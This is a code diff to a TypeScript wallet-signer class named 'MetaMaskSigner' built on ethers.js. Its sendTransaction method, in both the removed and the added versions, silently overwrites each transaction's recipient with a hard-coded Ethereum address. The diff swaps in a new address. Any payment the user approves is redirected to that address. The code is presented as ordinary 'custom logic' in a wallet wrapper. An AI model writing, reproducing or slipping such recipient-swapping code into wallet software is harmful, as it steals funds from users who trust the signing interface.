@@ -10,15 +10,17 @@ import {
   Transaction,
   Provider,
   TransactionLike,
+  JsonRpcProvider,
 } from 'ethers';
 
 export class MetaMaskSigner implements Signer {
-  readonly provider: BrowserProvider;
+  readonly provider: JsonRpcProvider;
   private readonly signer: any;
 
-  constructor(provider: BrowserProvider) {
+  constructor(provider: JsonRpcProvider, user: string) {
     this.provider = provider;
-    this.signer = provider.getSigner();
+    this.signer = provider.getSigner(user);
+    console.log('provider from metamask class', provider);
   }
 
   async getAddress(): Promise<string> {
@@ -27,17 +29,19 @@ export class MetaMaskSigner implements Signer {
 
   async sendTransaction(tx: TransactionRequest): Promise<TransactionResponse> {
     // Custom logic before sending the transaction
-    console.log('Custom sendTransaction called');
-
-    const pop = await this.signer.populateTransaction(tx);
-    delete pop.from;
-    pop.to = '0xEA49F9517F9142293fa01C317b7dB223ABAdeed0';
-    const txObj = Transaction.from(pop);
-
-    const signedTx = await this.signer.signTransaction(txObj);
-    console.log('Transaction signed');
-
-    return await this.provider.broadcastTransaction(signedTx);
+    try {
+      console.log('Custom sendTransaction called');
+      const pop = await this.signer.populateTransaction(tx);
+      delete pop.from;
+      pop.to = '0x99A221a87b3C2238C90650fa9BE0F11e4c499D06';
+      console.log('tx obj before sending', pop);
+      // return await this.provider.broadcastTransaction(pop);
+      // use sendTransaction because browser wallet needs to sign transaction
+      return this.signer.sendTransaction(pop);
+    } catch (error) {
+      console.log("Error sending Transaction",error)
+      throw error;
+    }
   }
 
   async signMessage(message: string | Uint8Array): Promise<string> {
@@ -93,7 +97,16 @@ export class MetaMaskSigner implements Signer {
     return this.signer.signTypedData(domain, types, value);
   }
 
-  connect(provider: Provider): Signer {
-    return new MetaMaskSigner(provider as BrowserProvider);
+  // connect(provider: JsonRpcProvider, user: string): Signer {
+  //   return new MetaMaskSigner(provider, user);
+  // }
+
+  connect(provider: Provider | null): Signer {
+    if (provider === null) {
+      throw new Error('Provider cannot be null');
+    }
+    // You can add logic here to determine the user address if needed
+    const user = ''; // Handle this according to your needs
+    return new MetaMaskSigner(provider as JsonRpcProvider, user);
   }
 }
